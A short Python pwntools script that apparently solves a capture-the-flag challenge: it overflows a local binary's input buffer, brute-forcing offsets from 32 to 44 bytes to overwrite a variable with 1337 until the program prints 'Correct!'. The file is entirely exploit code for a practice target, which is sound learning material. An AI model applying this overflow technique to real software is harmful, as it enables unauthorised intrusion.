from pwn import *

for offset in range(32, 48, 4):  # Testing offsets around 32-48
    print(f"[*] Trying offset: {offset}")
    
    p = process("./chall")
    payload = b"A" * offset + p32(1337)  # Overwrite 'number'
    
    p.sendlineafter("Insert flag here: ", payload)
    response = p.recvall().decode()

    if "Correct!" in response:
        print(f"[+] Success with offset {offset}!")
        print(response)
        break
    else:
        print(f"[-] Offset {offset} failed.")
